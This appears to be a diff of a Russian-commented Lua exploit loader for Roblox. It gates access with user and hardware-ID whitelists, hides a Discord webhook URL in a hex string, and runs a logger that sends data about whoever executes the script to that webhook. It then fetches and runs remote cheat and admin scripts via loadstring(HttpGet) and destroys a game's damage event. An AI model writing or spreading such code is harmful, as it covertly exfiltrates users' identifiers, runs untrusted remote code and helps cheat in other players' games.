@@ -6,14 +6,15 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _RAS = game:GetService("RbxAnalyticsService")
 
--- КОНФИГУРАЦИЯ (Вайтлист пуст)
+-- КОНФИГУРАЦИЯ
 local Config = {
-    WL = { 
-        UIDs = {"1644351300"},
+    WL = {
+        UIDs = {"1644351300"}, -- nazarkus
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"} },
+        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
+    },
     BL = { 
-        UIDs = {"8085944684"}, 
+        UIDs = {"8085944684"}, -- BE_bom
         HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"}, 
         Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"} 
     }
@@ -44,7 +45,7 @@ local function _D(h)
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
--- ФУНКЦИЯ ЛОГГЕРА (ФОРМАТ 1 В 1)
+-- ФУНКЦИЯ ЛОГГЕРА (ФУЛЛ ФОРМАТ)
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
@@ -109,31 +110,31 @@ end
 
 task.spawn(_LOG)
 
--- ПРОВЕРКА БЛЕКЛИСТА
+-- КИК ЧЕРНОГО СПИСКА
 if _isBL then _lp:Kick("Banned.") return end
 
--- ПРОВЕРКА АВТОРИЗАЦИИ (Исправлено под твой лоадер)
+-- ПРОВЕРКА ЛОАДЕРА
 local _stg = _ts:FindFirstChild("__NK_RUNTIME")
 local _auth = _stg and _stg:FindFirstChild(_lp.Name)
 
 if not _isWL then
-    -- Проверяем shared (underscore) и StringValue (asterisk из твоего лоадера)
     local hasShared = (shared._NK_AUTH == "V8_SECURE_AUTH")
     local hasValue = (_auth and (_auth.Value == "V8_SECURE_AUTH" or _auth.Value == "V8*SECURE_AUTH"))
-    
     if not (hasShared or hasValue) then
         _lp:Kick("Execution prohibited. Run through the loader.")
         return
     end
 end
-
 shared._NK_AUTH = nil
 
--- ЗАГРУЗКА
+-- ЗАГРУЗКА СКРИПТОВ
 local function safeLoad(url) pcall(function() loadstring(game:HttpGet(url))() end) end
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
 safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
+
+-- ФИКС ACS
+pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
 
 if _auth then _auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end) end
